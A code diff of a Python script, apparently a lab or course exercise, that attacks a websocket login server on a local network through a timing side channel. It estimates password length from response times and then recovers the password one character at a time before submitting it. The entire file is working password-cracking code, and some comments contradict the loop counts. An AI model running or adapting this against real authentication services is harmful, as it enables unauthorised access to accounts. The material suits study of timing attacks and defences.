@@ -1,15 +1,10 @@
-import socket
-import sys
+from socket import *
+from sys import *
 import asyncio
 import websockets
 import json
 import time
-import statistics
-
-passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]
-test = 0
-tijd = 0
-number = 0
+from statistics import *
 
 async def client_stub(username, password):
     server_address = "ws://192.168.1.10:3840"
@@ -30,26 +25,80 @@ async def client_stub(username, password):
             err_count += 1
             continue
 
-def call_server(username, password):
-    reply, time_delta = asyncio.get_event_loop().run_until_complete(client_stub(username, password))
+async def call_server(username, password):
+    reply, time_delta = await client_stub(username, password)
     if reply[-15:] == 'Access Granted!':
         print('Correct password found: {}'.format(password))
-    time.sleep(0.001)  # Make sure to wait so as to not overload the server!
+    else:
+        print('Incorrect password: {}'.format(password))
     return reply, time_delta
 
-for password in passwords:
-    while number <= len(passwords):
-        info = call_server("000000", password)
-        tijd += info[1]
-        print("Elapsed total time:", tijd, "seconds")
-        number += 1
-    print("Total time for password '{}': {}".format(password, tijd))
-    tijd = 0
-    number = 0
+
+async def guess_password(username):
+    passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]
+
+    max_average_time = 0
+    guessed_length = 0
+
+    for password in passwords:
+        total_time = 0
+        num_attempts = 50
+
+        for a in range(num_attempts):
+            time.sleep(0.001)
+            info = await client_stub("000000", password)
+            total_time += info[1]
+            print("Elapsed total time:", total_time, "seconds")
+
+        average_time = total_time / num_attempts
+        print("Average time for password '{}': {}".format(password, average_time))
+
+        if average_time > max_average_time:
+            max_average_time = average_time
+            guessed_length = len(password)
+
+    print("Guessed password length:", guessed_length)
+
+    password_length = guessed_length
+    password = ""
+    characters = "abcdefghijklmnopqrstuvwxyz1234567890"  # Alleen het eerste karakter wordt gebruikt
+
+    while len(password) < password_length:
+        max_average_time = float("-inf")
+        next_char = None
+
+        for char in characters:
+            response_times = []
+
+            for _ in range(150):  # Probeer elk karakter 25 keer
+                guess = password + char + "0" * (password_length - len(password) - 1)
+                time.sleep(0.001)
+                _, response_time = await client_stub(username, guess)
+                response_times.append(response_time)
+                print(f"Guessing '{guess}' -> Response time: {response_time}")
+
+            average_time = sum(response_times) / len(response_times)
+            print(f"Average response time for character '{char}': {average_time}")
+
+            if next_char is None or average_time > max_average_time:
+                max_average_time = average_time
+                next_char = char
+
+        print(f"Next character to try: '{next_char}' with average time: {max_average_time}")
+        password += next_char
+        print(f"Password so far: {password}")
+
+    # Call the server with the generated password
+    await call_server(username, password)
 
 
+    return password
 
+async def main():
+    username = "453713"  # Assuming this is your username
+    await guess_password(username)
 
+asyncio.run(main())
 
 
 
